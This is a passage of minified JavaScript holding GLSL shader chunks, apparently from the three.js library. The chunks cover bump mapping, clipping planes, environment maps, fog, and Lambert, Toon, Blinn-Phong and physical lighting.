		vec2 dSTdx = dFdx( vBumpMapUv );
		vec2 dSTdy = dFdy( vBumpMapUv );
		float Hll = bumpScale * texture2D( bumpMap, vBumpMapUv ).x;
		float dBx = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdx ).x - Hll;
		float dBy = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdy ).x - Hll;
		return vec2( dBx, dBy );
	}
	vec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy, float faceDirection ) {
		vec3 vSigmaX = normalize( dFdx( surf_pos.xyz ) );
		vec3 vSigmaY = normalize( dFdy( surf_pos.xyz ) );
		vec3 vN = surf_norm;
		vec3 R1 = cross( vSigmaY, vN );
		vec3 R2 = cross( vN, vSigmaX );
		float fDet = dot( vSigmaX, R1 ) * faceDirection;
		vec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );
		return normalize( abs( fDet ) * surf_norm - vGrad );
	}
#endif`,xE=`#if NUM_CLIPPING_PLANES > 0
	vec4 plane;
	#ifdef ALPHA_TO_COVERAGE
		float distanceToPlane, distanceGradient;
		float clipOpacity = 1.0;
		#pragma unroll_loop_start
		for ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {
			plane = clippingPlanes[ i ];
			distanceToPlane = - dot( vClipPosition, plane.xyz ) + plane.w;
			distanceGradient = fwidth( distanceToPlane ) / 2.0;
			clipOpacity *= smoothstep( - distanceGradient, distanceGradient, distanceToPlane );
			if ( clipOpacity == 0.0 ) discard;
		}
		#pragma unroll_loop_end
		#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES
			float unionClipOpacity = 1.0;
			#pragma unroll_loop_start
			for ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {
				plane = clippingPlanes[ i ];
				distanceToPlane = - dot( vClipPosition, plane.xyz ) + plane.w;
				distanceGradient = fwidth( distanceToPlane ) / 2.0;
				unionClipOpacity *= 1.0 - smoothstep( - distanceGradient, distanceGradient, distanceToPlane );
			}
			#pragma unroll_loop_end
			clipOpacity *= 1.0 - unionClipOpacity;
		#endif
		diffuseColor.a *= clipOpacity;
		if ( diffuseColor.a == 0.0 ) discard;
	#else
		#pragma unroll_loop_start
		for ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {
			plane = clippingPlanes[ i ];
			if ( dot( vClipPosition, plane.xyz ) > plane.w ) discard;
		}
		#pragma unroll_loop_end
		#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES
			bool clipped = true;
			#pragma unroll_loop_start
			for ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {
				plane = clippingPlanes[ i ];
				clipped = ( dot( vClipPosition, plane.xyz ) > plane.w ) && clipped;
			}
			#pragma unroll_loop_end
			if ( clipped ) discard;
		#endif
	#endif
#endif`,yE=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
	uniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];
#endif`,SE=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
#endif`,bE=`#if NUM_CLIPPING_PLANES > 0
	vClipPosition = - mvPosition.xyz;
#endif`,wE=`#if defined( USE_COLOR_ALPHA )
	diffuseColor *= vColor;
#elif defined( USE_COLOR )
	diffuseColor.rgb *= vColor;
#endif`,EE=`#if defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#elif defined( USE_COLOR )
	varying vec3 vColor;
#endif`,ME=`#if defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR ) || defined( USE_BATCHING_COLOR )
	varying vec3 vColor;
#endif`,TE=`#if defined( USE_COLOR_ALPHA )
	vColor = vec4( 1.0 );
#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR ) || defined( USE_BATCHING_COLOR )
	vColor = vec3( 1.0 );
#endif
#ifdef USE_COLOR
	vColor *= color;
#endif
#ifdef USE_INSTANCING_COLOR
	vColor.xyz *= instanceColor.xyz;
#endif
#ifdef USE_BATCHING_COLOR
	vec3 batchingColor = getBatchingColor( getIndirectIndex( gl_DrawID ) );
	vColor.xyz *= batchingColor.xyz;
#endif`,AE=`#define PI 3.141592653589793
#define PI2 6.283185307179586
#define PI_HALF 1.5707963267948966
#define RECIPROCAL_PI 0.3183098861837907
#define RECIPROCAL_PI2 0.15915494309189535
#define EPSILON 1e-6
#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
#define whiteComplement( a ) ( 1.0 - saturate( a ) )
float pow2( const in float x ) { return x*x; }
vec3 pow2( const in vec3 x ) { return x*x; }
float pow3( const in float x ) { return x*x*x; }
float pow4( const in float x ) { float x2 = x*x; return x2*x2; }
float max3( const in vec3 v ) { return max( max( v.x, v.y ), v.z ); }
float average( const in vec3 v ) { return dot( v, vec3( 0.3333333 ) ); }
highp float rand( const in vec2 uv ) {
	const highp float a = 12.9898, b = 78.233, c = 43758.5453;
	highp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );
	return fract( sin( sn ) * c );
}
#ifdef HIGH_PRECISION
	float precisionSafeLength( vec3 v ) { return length( v ); }
#else
	float precisionSafeLength( vec3 v ) {
		float maxComponent = max3( abs( v ) );
		return length( v / maxComponent ) * maxComponent;
	}
#endif
struct IncidentLight {
	vec3 color;
	vec3 direction;
	bool visible;
};
struct ReflectedLight {
	vec3 directDiffuse;
	vec3 directSpecular;
	vec3 indirectDiffuse;
	vec3 indirectSpecular;
};
#ifdef USE_ALPHAHASH
	varying vec3 vPosition;
#endif
vec3 transformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );
}
vec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );
}
bool isPerspectiveMatrix( mat4 m ) {
	return m[ 2 ][ 3 ] == - 1.0;
}
vec2 equirectUv( in vec3 dir ) {
	float u = atan( dir.z, dir.x ) * RECIPROCAL_PI2 + 0.5;
	float v = asin( clamp( dir.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;
	return vec2( u, v );
}
vec3 BRDF_Lambert( const in vec3 diffuseColor ) {
	return RECIPROCAL_PI * diffuseColor;
}
vec3 F_Schlick( const in vec3 f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
}
float F_Schlick( const in float f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
} // validated`,CE=`#ifdef ENVMAP_TYPE_CUBE_UV
	#define cubeUV_minMipLevel 4.0
	#define cubeUV_minTileSize 16.0
	float getFace( vec3 direction ) {
		vec3 absDirection = abs( direction );
		float face = - 1.0;
		if ( absDirection.x > absDirection.z ) {
			if ( absDirection.x > absDirection.y )
				face = direction.x > 0.0 ? 0.0 : 3.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		} else {
			if ( absDirection.z > absDirection.y )
				face = direction.z > 0.0 ? 2.0 : 5.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		}
		return face;
	}
	vec2 getUV( vec3 direction, float face ) {
		vec2 uv;
		if ( face == 0.0 ) {
			uv = vec2( direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 1.0 ) {
			uv = vec2( - direction.x, - direction.z ) / abs( direction.y );
		} else if ( face == 2.0 ) {
			uv = vec2( - direction.x, direction.y ) / abs( direction.z );
		} else if ( face == 3.0 ) {
			uv = vec2( - direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 4.0 ) {
			uv = vec2( - direction.x, direction.z ) / abs( direction.y );
		} else {
			uv = vec2( direction.x, direction.y ) / abs( direction.z );
		}
		return 0.5 * ( uv + 1.0 );
	}
	vec3 bilinearCubeUV( sampler2D envMap, vec3 direction, float mipInt ) {
		float face = getFace( direction );
		float filterInt = max( cubeUV_minMipLevel - mipInt, 0.0 );
		mipInt = max( mipInt, cubeUV_minMipLevel );
		float faceSize = exp2( mipInt );
		highp vec2 uv = getUV( direction, face ) * ( faceSize - 2.0 ) + 1.0;
		if ( face > 2.0 ) {
			uv.y += faceSize;
			face -= 3.0;
		}
		uv.x += face * faceSize;
		uv.x += filterInt * 3.0 * cubeUV_minTileSize;
		uv.y += 4.0 * ( exp2( CUBEUV_MAX_MIP ) - faceSize );
		uv.x *= CUBEUV_TEXEL_WIDTH;
		uv.y *= CUBEUV_TEXEL_HEIGHT;
		#ifdef texture2DGradEXT
			return texture2DGradEXT( envMap, uv, vec2( 0.0 ), vec2( 0.0 ) ).rgb;
		#else
			return texture2D( envMap, uv ).rgb;
		#endif
	}
	#define cubeUV_r0 1.0
	#define cubeUV_m0 - 2.0
	#define cubeUV_r1 0.8
	#define cubeUV_m1 - 1.0
	#define cubeUV_r4 0.4
	#define cubeUV_m4 2.0
	#define cubeUV_r5 0.305
	#define cubeUV_m5 3.0
	#define cubeUV_r6 0.21
	#define cubeUV_m6 4.0
	float roughnessToMip( float roughness ) {
		float mip = 0.0;
		if ( roughness >= cubeUV_r1 ) {
			mip = ( cubeUV_r0 - roughness ) * ( cubeUV_m1 - cubeUV_m0 ) / ( cubeUV_r0 - cubeUV_r1 ) + cubeUV_m0;
		} else if ( roughness >= cubeUV_r4 ) {
			mip = ( cubeUV_r1 - roughness ) * ( cubeUV_m4 - cubeUV_m1 ) / ( cubeUV_r1 - cubeUV_r4 ) + cubeUV_m1;
		} else if ( roughness >= cubeUV_r5 ) {
			mip = ( cubeUV_r4 - roughness ) * ( cubeUV_m5 - cubeUV_m4 ) / ( cubeUV_r4 - cubeUV_r5 ) + cubeUV_m4;
		} else if ( roughness >= cubeUV_r6 ) {
			mip = ( cubeUV_r5 - roughness ) * ( cubeUV_m6 - cubeUV_m5 ) / ( cubeUV_r5 - cubeUV_r6 ) + cubeUV_m5;
		} else {
			mip = - 2.0 * log2( 1.16 * roughness );		}
		return mip;
	}
	vec4 textureCubeUV( sampler2D envMap, vec3 sampleDir, float roughness ) {
		float mip = clamp( roughnessToMip( roughness ), cubeUV_m0, CUBEUV_MAX_MIP );
		float mipF = fract( mip );
		float mipInt = floor( mip );
		vec3 color0 = bilinearCubeUV( envMap, sampleDir, mipInt );
		if ( mipF == 0.0 ) {
			return vec4( color0, 1.0 );
		} else {
			vec3 color1 = bilinearCubeUV( envMap, sampleDir, mipInt + 1.0 );
			return vec4( mix( color0, color1, mipF ), 1.0 );
		}
	}
#endif`,RE=`vec3 transformedNormal = objectNormal;
#ifdef USE_TANGENT
	vec3 transformedTangent = objectTangent;
#endif
#ifdef USE_BATCHING
	mat3 bm = mat3( batchingMatrix );
	transformedNormal /= vec3( dot( bm[ 0 ], bm[ 0 ] ), dot( bm[ 1 ], bm[ 1 ] ), dot( bm[ 2 ], bm[ 2 ] ) );
	transformedNormal = bm * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = bm * transformedTangent;
	#endif
#endif
#ifdef USE_INSTANCING
	mat3 im = mat3( instanceMatrix );
	transformedNormal /= vec3( dot( im[ 0 ], im[ 0 ] ), dot( im[ 1 ], im[ 1 ] ), dot( im[ 2 ], im[ 2 ] ) );
	transformedNormal = im * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = im * transformedTangent;
	#endif
#endif
transformedNormal = normalMatrix * transformedNormal;
#ifdef FLIP_SIDED
	transformedNormal = - transformedNormal;
#endif
#ifdef USE_TANGENT
	transformedTangent = ( modelViewMatrix * vec4( transformedTangent, 0.0 ) ).xyz;
	#ifdef FLIP_SIDED
		transformedTangent = - transformedTangent;
	#endif
#endif`,PE=`#ifdef USE_DISPLACEMENTMAP
	uniform sampler2D displacementMap;
	uniform float displacementScale;
	uniform float displacementBias;
#endif`,kE=`#ifdef USE_DISPLACEMENTMAP
	transformed += normalize( objectNormal ) * ( texture2D( displacementMap, vDisplacementMapUv ).x * displacementScale + displacementBias );
#endif`,LE=`#ifdef USE_EMISSIVEMAP
	vec4 emissiveColor = texture2D( emissiveMap, vEmissiveMapUv );
	#ifdef DECODE_VIDEO_TEXTURE_EMISSIVE
		emissiveColor = sRGBTransferEOTF( emissiveColor );
	#endif
	totalEmissiveRadiance *= emissiveColor.rgb;
#endif`,NE=`#ifdef USE_EMISSIVEMAP
	uniform sampler2D emissiveMap;
#endif`,IE="gl_FragColor = linearToOutputTexel( gl_FragColor );",DE=`vec4 LinearTransferOETF( in vec4 value ) {
	return value;
}
vec4 sRGBTransferEOTF( in vec4 value ) {
	return vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.a );
}
vec4 sRGBTransferOETF( in vec4 value ) {
	return vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );
}`,UE=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vec3 cameraToFrag;
		if ( isOrthographic ) {
			cameraToFrag = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToFrag = normalize( vWorldPosition - cameraPosition );
		}
		vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vec3 reflectVec = reflect( cameraToFrag, worldNormal );
		#else
			vec3 reflectVec = refract( cameraToFrag, worldNormal, refractionRatio );
		#endif
	#else
		vec3 reflectVec = vReflect;
	#endif
	#ifdef ENVMAP_TYPE_CUBE
		vec4 envColor = textureCube( envMap, envMapRotation * vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );
	#else
		vec4 envColor = vec4( 0.0 );
	#endif
	#ifdef ENVMAP_BLENDING_MULTIPLY
		outgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );
	#elif defined( ENVMAP_BLENDING_MIX )
		outgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );
	#elif defined( ENVMAP_BLENDING_ADD )
		outgoingLight += envColor.xyz * specularStrength * reflectivity;
	#endif
#endif`,OE=`#ifdef USE_ENVMAP
	uniform float envMapIntensity;
	uniform float flipEnvMap;
	uniform mat3 envMapRotation;
	#ifdef ENVMAP_TYPE_CUBE
		uniform samplerCube envMap;
	#else
		uniform sampler2D envMap;
	#endif
#endif`,FE=`#ifdef USE_ENVMAP
	uniform float reflectivity;
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		varying vec3 vWorldPosition;
		uniform float refractionRatio;
	#else
		varying vec3 vReflect;
	#endif
#endif`,BE=`#ifdef USE_ENVMAP
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		
		varying vec3 vWorldPosition;
	#else
		varying vec3 vReflect;
		uniform float refractionRatio;
	#endif
#endif`,zE=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vWorldPosition = worldPosition.xyz;
	#else
		vec3 cameraToVertex;
		if ( isOrthographic ) {
			cameraToVertex = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToVertex = normalize( worldPosition.xyz - cameraPosition );
		}
		vec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vReflect = reflect( cameraToVertex, worldNormal );
		#else
			vReflect = refract( cameraToVertex, worldNormal, refractionRatio );
		#endif
	#endif
#endif`,VE=`#ifdef USE_FOG
	vFogDepth = - mvPosition.z;
#endif`,HE=`#ifdef USE_FOG
	varying float vFogDepth;
#endif`,GE=`#ifdef USE_FOG
	#ifdef FOG_EXP2
		float fogFactor = 1.0 - exp( - fogDensity * fogDensity * vFogDepth * vFogDepth );
	#else
		float fogFactor = smoothstep( fogNear, fogFar, vFogDepth );
	#endif
	gl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );
#endif`,WE=`#ifdef USE_FOG
	uniform vec3 fogColor;
	varying float vFogDepth;
	#ifdef FOG_EXP2
		uniform float fogDensity;
	#else
		uniform float fogNear;
		uniform float fogFar;
	#endif
#endif`,jE=`#ifdef USE_GRADIENTMAP
	uniform sampler2D gradientMap;
#endif
vec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {
	float dotNL = dot( normal, lightDirection );
	vec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );
	#ifdef USE_GRADIENTMAP
		return vec3( texture2D( gradientMap, coord ).r );
	#else
		vec2 fw = fwidth( coord ) * 0.5;
		return mix( vec3( 0.7 ), vec3( 1.0 ), smoothstep( 0.7 - fw.x, 0.7 + fw.x, coord.x ) );
	#endif
}`,XE=`#ifdef USE_LIGHTMAP
	uniform sampler2D lightMap;
	uniform float lightMapIntensity;
#endif`,qE=`LambertMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularStrength = specularStrength;`,YE=`varying vec3 vViewPosition;
struct LambertMaterial {
	vec3 diffuseColor;
	float specularStrength;
};
void RE_Direct_Lambert( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Lambert( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Lambert
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Lambert`,$E=`uniform bool receiveShadow;
uniform vec3 ambientLightColor;
#if defined( USE_LIGHT_PROBES )
	uniform vec3 lightProbe[ 9 ];
#endif
vec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {
	float x = normal.x, y = normal.y, z = normal.z;
	vec3 result = shCoefficients[ 0 ] * 0.886227;
	result += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;
	result += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;
	result += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;
	result += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;
	result += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;
	result += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );
	result += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;
	result += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );
	return result;
}
vec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in vec3 normal ) {
	vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
	vec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );
	return irradiance;
}
vec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {
	vec3 irradiance = ambientLightColor;
	return irradiance;
}
float getDistanceAttenuation( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {
	float distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );
	if ( cutoffDistance > 0.0 ) {
		distanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );
	}
	return distanceFalloff;
}
float getSpotAttenuation( const in float coneCosine, const in float penumbraCosine, const in float angleCosine ) {
	return smoothstep( coneCosine, penumbraCosine, angleCosine );
}
#if NUM_DIR_LIGHTS > 0
	struct DirectionalLight {
		vec3 direction;
		vec3 color;
	};
	uniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];
	void getDirectionalLightInfo( const in DirectionalLight directionalLight, out IncidentLight light ) {
		light.color = directionalLight.color;
		light.direction = directionalLight.direction;
		light.visible = true;
	}
#endif
#if NUM_POINT_LIGHTS > 0
	struct PointLight {
		vec3 position;
		vec3 color;
		float distance;
		float decay;
	};
	uniform PointLight pointLights[ NUM_POINT_LIGHTS ];
	void getPointLightInfo( const in PointLight pointLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = pointLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float lightDistance = length( lVector );
		light.color = pointLight.color;
		light.color *= getDistanceAttenuation( lightDistance, pointLight.distance, pointLight.decay );
		light.visible = ( light.color != vec3( 0.0 ) );
	}
#endif
#if NUM_SPOT_LIGHTS > 0
	struct SpotLight {
		vec3 position;
		vec3 direction;
		vec3 color;
		float distance;
		float decay;
		float coneCos;
		float penumbraCos;
	};
	uniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];
	void getSpotLightInfo( const in SpotLight spotLight, const in vec3 geometryPosition, out IncidentLight light ) {
		vec3 lVector = spotLight.position - geometryPosition;
		light.direction = normalize( lVector );
		float angleCos = dot( light.direction, spotLight.direction );
		float spotAttenuation = getSpotAttenuation( spotLight.coneCos, spotLight.penumbraCos, angleCos );
		if ( spotAttenuation > 0.0 ) {
			float lightDistance = length( lVector );
			light.color = spotLight.color * spotAttenuation;
			light.color *= getDistanceAttenuation( lightDistance, spotLight.distance, spotLight.decay );
			light.visible = ( light.color != vec3( 0.0 ) );
		} else {
			light.color = vec3( 0.0 );
			light.visible = false;
		}
	}
#endif
#if NUM_RECT_AREA_LIGHTS > 0
	struct RectAreaLight {
		vec3 color;
		vec3 position;
		vec3 halfWidth;
		vec3 halfHeight;
	};
	uniform sampler2D ltc_1;	uniform sampler2D ltc_2;
	uniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];
#endif
#if NUM_HEMI_LIGHTS > 0
	struct HemisphereLight {
		vec3 direction;
		vec3 skyColor;
		vec3 groundColor;
	};
	uniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];
	vec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in vec3 normal ) {
		float dotNL = dot( normal, hemiLight.direction );
		float hemiDiffuseWeight = 0.5 * dotNL + 0.5;
		vec3 irradiance = mix( hemiLight.groundColor, hemiLight.skyColor, hemiDiffuseWeight );
		return irradiance;
	}
#endif`,KE=`#ifdef USE_ENVMAP
	vec3 getIBLIrradiance( const in vec3 normal ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, envMapRotation * worldNormal, 1.0 );
			return PI * envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	vec3 getIBLRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness ) {
		#ifdef ENVMAP_TYPE_CUBE_UV
			vec3 reflectVec = reflect( - viewDir, normal );
			reflectVec = normalize( mix( reflectVec, normal, pow4( roughness ) ) );
			reflectVec = inverseTransformDirection( reflectVec, viewMatrix );
			vec4 envMapColor = textureCubeUV( envMap, envMapRotation * reflectVec, roughness );
			return envMapColor.rgb * envMapIntensity;
		#else
			return vec3( 0.0 );
		#endif
	}
	#ifdef USE_ANISOTROPY
		vec3 getIBLAnisotropyRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in vec3 bitangent, const in float anisotropy ) {
			#ifdef ENVMAP_TYPE_CUBE_UV
				vec3 bentNormal = cross( bitangent, viewDir );
				bentNormal = normalize( cross( bentNormal, bitangent ) );
				bentNormal = normalize( mix( bentNormal, normal, pow2( pow2( 1.0 - anisotropy * ( 1.0 - roughness ) ) ) ) );
				return getIBLRadiance( viewDir, bentNormal, roughness );
			#else
				return vec3( 0.0 );
			#endif
		}
	#endif
#endif`,ZE=`ToonMaterial material;
material.diffuseColor = diffuseColor.rgb;`,JE=`varying vec3 vViewPosition;
struct ToonMaterial {
	vec3 diffuseColor;
};
void RE_Direct_Toon( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	vec3 irradiance = getGradientIrradiance( geometryNormal, directLight.direction ) * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Toon( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in ToonMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Toon
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Toon`,QE=`BlinnPhongMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularColor = specular;
material.specularShininess = shininess;
material.specularStrength = specularStrength;`,eM=`varying vec3 vViewPosition;
struct BlinnPhongMaterial {
	vec3 diffuseColor;
	vec3 specularColor;
	float specularShininess;
	float specularStrength;
};
void RE_Direct_BlinnPhong( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
	reflectedLight.directSpecular += irradiance * BRDF_BlinnPhong( directLight.direction, geometryViewDir, geometryNormal, material.specularColor, material.specularShininess ) * material.specularStrength;
}
void RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_BlinnPhong
#define RE_IndirectDiffuse		RE_IndirectDiffuse_BlinnPhong`,tM=`PhysicalMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.diffuseContribution = diffuseColor.rgb * ( 1.0 - metalnessFactor );
material.metalness = metalnessFactor;
vec3 dxy = max( abs( dFdx( nonPerturbedNormal ) ), abs( dFdy( nonPerturbedNormal ) ) );
float geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );
material.roughness = max( roughnessFactor, 0.0525 );material.roughness += geometryRoughness;
material.roughness = min( material.roughness, 1.0 );
#ifdef IOR
	material.ior = ior;
	#ifdef USE_SPECULAR
		float specularIntensityFactor = specularIntensity;
		vec3 specularColorFactor = specularColor;
		#ifdef USE_SPECULAR_COLORMAP
			specularColorFactor *= texture2D( specularColorMap, vSpecularColorMapUv ).rgb;
		#endif
		#ifdef USE_SPECULAR_INTENSITYMAP
			specularIntensityFactor *= texture2D( specularIntensityMap, vSpecularIntensityMapUv ).a;
		#endif
		material.specularF90 = mix( specularIntensityFactor, 1.0, metalnessFactor );
	#else
		float specularIntensityFactor = 1.0;
		vec3 specularColorFactor = vec3( 1.0 );
		material.specularF90 = 1.0;
	#endif
	material.specularColor = min( pow2( ( material.ior - 1.0 ) / ( material.ior + 1.0 ) ) * specularColorFactor, vec3( 1.0 ) ) * specularIntensityFactor;
	material.specularColorBlended = mix( material.specularColor, diffuseColor.rgb, metalnessFactor );
#else
	material.specularColor = vec3( 0.04 );
	material.specularColorBlended = mix( material.specularColor, diffuseColor.rgb, metalnessFactor );
	material.specularF90 = 1.0;
#endif
#ifdef USE_CLEARCOAT
	material.clearcoat = clearcoat;
	material.clearcoatRoughness = clearcoatRoughness;
	material.clearcoatF0 = vec3( 0.04 );
	material.clearcoatF90 = 1.0;
	#ifdef USE_CLEARCOATMAP
		material.clearcoat *= texture2D( clearcoatMap, vClearcoatMapUv ).x;
	#endif
	#ifdef USE_CLEARCOAT_ROUGHNESSMAP
		material.clearcoatRoughness *= texture2D( clearcoatRoughnessMap, vClearcoatRoughnessMapUv ).y;
	#endif
	material.clearcoat = saturate( material.clearcoat );	material.clearcoatRoughness = max( material.clearcoatRoughness, 0.0525 );
	material.clearcoatRoughness += geometryRoughness;
	material.clearcoatRoughness = min( material.clearcoatRoughness, 1.0 );
#endif
#ifdef USE_DISPERSION
	material.dispersion = dispersion;
#endif
#ifdef USE_IRIDESCENCE
	material.iridescence = iridescence;
	material.iridescenceIOR = iridescenceIOR;
	#ifdef USE_IRIDESCENCEMAP
		material.iridescence *= texture2D( iridescenceMap, vIridescenceMapUv ).r;
	#endif
	#ifdef USE_IRIDESCENCE_THICKNESSMAP
		material.iridescenceThickness = (iridescenceThicknessMaximum - iridescenceThicknessMinimum) * texture2D( iridescenceThicknessMap, vIridescenceThicknessMapUv ).g + iridescenceThicknessMinimum;
	#else
		material.iridescenceThickness = iridescenceThicknessMaximum;
	#endif
#endif
#ifdef USE_SHEEN
	material.sheenColor = sheenColor;
	#ifdef USE_SHEEN_COLORMAP
		material.sheenColor *= texture2D( sheenColorMap, vSheenColorMapUv ).rgb;
	#endif
